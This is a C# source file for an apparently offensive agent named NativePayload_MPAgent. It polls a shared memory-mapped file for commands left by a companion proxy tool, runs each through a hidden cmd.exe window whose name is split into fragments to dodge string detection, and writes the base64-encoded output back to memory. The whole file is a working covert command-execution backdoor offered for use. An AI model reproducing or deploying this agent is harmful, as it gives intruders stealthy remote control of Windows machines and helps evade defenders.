using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NativePayload_MPAgent
{
    class Program
    {
        public static string strOutput = "";
      
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_MPAgent , Published by Damon Mohammadbagher , Mar 2021");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_MPAgent , ClientMapper/Managed C# Shell Code (All Shell/Cmd outputs will inject into Memory only) ");
            Console.WriteLine();
            Console.WriteLine("syntax: NativePayload_MPAgent.exe ");
            Console.WriteLine("example: NativePayload_MPAgent");
            Console.WriteLine();
            Console.WriteLine("[!] Waiting for Commands from Mapper/Proxy tool (NativePayload_MPx.exe) by scanning Memory only....");
            Console.WriteLine();

            new Thread(() =>
            {

                using (MemoryMappedFile _in_memory = MemoryMappedFile.CreateNew("ClientMapper", 1024 * 1024))
                {
                ops:
                    strOutput = "";
                    bool mutexCreated;
                    Mutex mutex = new Mutex(true, "_ClientMapper", out mutexCreated);
                    using (MemoryMappedViewStream stream1 = _in_memory.CreateViewStream())
                    {
                        BinaryWriter writer = new BinaryWriter(stream1);
                        writer.Write(DateTime.Now.ToString() + " [ClientMapper].[NativePayload_MPAgent]::PID:" + Process.GetCurrentProcess().Id.ToString() + "\n" + "@getcmd=");
                    }

                    Thread.Sleep(10000);

                    bool mutexCreated2;
                    Mutex mutex2 = new Mutex(true, "_ClientMapper2", out mutexCreated2);
                    using (MemoryMappedViewStream stream = _in_memory.CreateViewStream())
                    {
                        BinaryReader reader = new BinaryReader(stream);
                        Console.WriteLine("Searching in-Memory...");
                        string rd = reader.ReadString();
                        if (rd.Contains("NativePayload_MP.CS.cmd =>"))
                        {
                            string cmd = rd.Split('>')[1];

                            Console.WriteLine("[!] New cmd Found! [" + DateTime.Now.ToString() + "] =>" + cmd);
                            System.Diagnostics.Process outputs = new System.Diagnostics.Process();
                            System.Threading.Thread.Sleep(1100);
                            outputs.StartInfo.FileName = "c" + "m" + "d.e" + "xe";
                            outputs.StartInfo.Arguments = "/c " + cmd;
                            outputs.StartInfo.CreateNoWindow = true;
                            outputs.StartInfo.UseShellExecute = false;
                            outputs.StartInfo.RedirectStandardOutput = true;
                            outputs.StartInfo.RedirectStandardInput = true;
                            outputs.StartInfo.RedirectStandardError = true;

                            outputs.Start();

                            strOutput = Convert.ToBase64String(UnicodeEncoding.UTF8.GetBytes(outputs.StandardOutput.ReadToEnd()));

                            Thread.Sleep(5000);
                            Console.WriteLine(strOutput);
                            //  Thread.Sleep(5000);
                            bool mutexCreated3;
                            Mutex mutex3 = new Mutex(true, "_ClientMapper3", out mutexCreated3);
                            using (MemoryMappedViewStream stream1 = _in_memory.CreateViewStream())
                            {
                                BinaryWriter writer = new BinaryWriter(stream1);
                                writer.Write("cmd output => " + strOutput + "\n");
                                if (strOutput == "")
                                {
                                    Console.WriteLine("output Null/Empty: " + strOutput);
                                }
                            }
                        }


                    }

                    Thread.Sleep(5000);

                    goto ops;

                }
            }).Start();
        }

    }
    
}
